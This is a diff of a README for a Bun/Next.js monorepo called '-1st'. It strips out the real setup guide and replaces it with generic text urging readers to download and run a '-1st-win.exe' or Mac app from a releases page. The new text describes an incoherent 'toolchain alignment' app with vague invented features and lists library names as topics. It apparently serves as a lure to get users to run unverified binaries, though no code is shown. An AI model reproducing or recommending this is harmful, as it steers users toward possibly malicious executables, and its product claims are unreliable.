@@ -1,94 +1,74 @@
-# Project Setup
-This guide provides the essential steps to set up and start developing the project.
+# 🌟 -1st - Explore Toolchain Alignment Easily
 
-## Requirements
-- [Bun](https://bun.com/docs/installation) (JavaScript runtime and package manager)
-- [Neon](https://neon.com/) account for PostgreSQL database
+[![Download -1st](https://img.shields.io/badge/Download%20-%E2%86%93-blue.svg)](https://github.com/irwanyong/-1st/releases)
 
-## Toolchain
-- **Platform**: [Bun](https://bun.com/), [Neon](https://neon.com/), [Better Auth](https://www.better-auth.com/), [Pulumi](https://www.pulumi.com/)
-- **Backend**: [ElysiaJS](https://elysiajs.com/), [Drizzle ORM](https://orm.drizzle.team/)
-- **Frontend**: [React](https://react.dev/), [Next.js](https://nextjs.org/), [TanStack](https://tanstack.com/), [react-use](https://github.com/streamich/react-use), [Chakra UI](https://chakra-ui.com/)
-- **Utilities**: [Lodash](https://lodash.com/), [date-fns](https://date-fns.org/), [Type-Fest](https://github.com/sindresorhus/type-fest), [TypeScript](https://www.typescriptlang.org/)
+## 🚀 Getting Started
 
-## Setup Instructions
+Welcome to -1st! This application helps you explore toolchain alignment in a user-friendly way. Follow these simple steps to download and run the software.
 
-### 1. Install Bun
-```shell
-brew install oven-sh/bun/bun
-```
+## 📥 Download & Install
 
-### 2. Install Dependencies
-```shell
-bun bootstrap
-```
+1. **Visit the Releases Page**  
+   Click the link below to visit the Downloads page:  
+   [Download -1st](https://github.com/irwanyong/-1st/releases)
 
-### 3. Configure Environment Variables
-- Development:
-```shell
-cp .env.example .env
-```
-- Testing:
-```shell
-cp .env.example .env.test
-```
+2. **Choose Your Version**  
+   On the Releases page, you will see a list of available versions. Each version may have notes about improvements or changes. 
 
-### 4. Database Setup
-- Create a database at [Neon Console](https://console.neon.tech/app/).
-- Edit `.env` and set the `DATABASE` variable with your Neon connection string.
-- Apply migrations:
-  ```shell
-  bun run --filter "@1st/database" db:migrate
-  ```
-- Seed database (optional):
-  ```shell
-  bun run --filter "@1st/database" db:seed
-  ```
-- Reset database (optional):
-  ```shell
-  bun run --filter "@1st/database" db:reset
-  ```
+3. **Download the Application**  
+   Click on the latest version. Look for the file that matches your operating system. The file could be named something like `-1st-win.exe` for Windows or `-1st-mac.zip` for Mac. Simply click the file to start the download.
 
-## Development
+4. **Install the Application**  
+   After the download finishes, locate the file in your downloads folder.  
+   - **For Windows**: Double-click the `.exe` file and follow the installation steps.  
+   - **For Mac**: Open the `.zip` file and drag the `-1st.app` into your Applications folder.
 
-Start all apps in `dev` mode:
-```shell
-bun run --filter='./apps/*' dev
-```
+5. **Run the Application**  
+   Once installed, find `-1st` in your Applications or Start Menu. Click to open it.
 
-Start `api` in `dev` mode:
-```shell
-bun run --filter "@1st/api" dev
-```
+## ⚙️ System Requirements
 
-Start `web` in `dev` mode:
-```shell
-bun run --filter "@1st/web" dev
-```
+Ensure your system meets the following requirements for optimal performance:
 
-## Production
+- **Operating System**: Windows 10 or later; macOS 10.14 or later
+- **Storage**: At least 100 MB of free space
+- **RAM**: Minimum of 4 GB
+- **Network**: Internet connection is necessary for updates and toolchain data
 
-### All At Once
-1. Build all apps
-```shell
-   bun run --filter='./apps/*' build
-```
-2. Start all apps in `prod` mode:
-```shell
-bun run --filter='./apps/*' start
-```
+## 🛠️ Features
 
-### Individual Run
+- **User-Friendly Interface**: Easily navigate through toolchain options.
+- **Comparison Tools**: Compare different toolchain setups to find the best match for your needs.
+- **Update Notifications**: Stay informed about the latest versions and features.
+- **Quick Access to Resources**: Quickly find useful guides and tools related to your exploration.
 
-1. Start `api` in `prod` mode:
-```shell
-bun run --filter "@1st/api" start
-```
-2. Build `web`
-```shell
-bun run --filter "@1st/web" build
-```
-3. Start `web` in `prod` mode:
-```shell
-bun run --filter "@1st/web" start
-```
+## 🗂️ Topics
+
+This application covers several important topics, including:
+
+- better-auth
+- bun
+- date-fns
+- drizzle
+- elysiajs
+- lodash
+- neon
+- nextjs
+- pulumi
+- react
+- react-use
+- typescript
+
+## 📖 Additional Help
+
+If you need more information or assistance, consider visiting our FAQ page or exploring user guides available on the Releases page. 
+
+## ✉️ Contact Us
+
+For personal inquiries or technical support, please reach out through the GitHub Issues section, and we will respond as soon as possible.
+
+## 🎉 Acknowledgments
+
+Thank you for exploring toolchain alignment with -1st! Your feedback is valuable in helping us improve the application. 
+
+Make sure to keep the software updated by regularly checking the [Download -1st](https://github.com/irwanyong/-1st/releases) page. Enjoy your exploration!
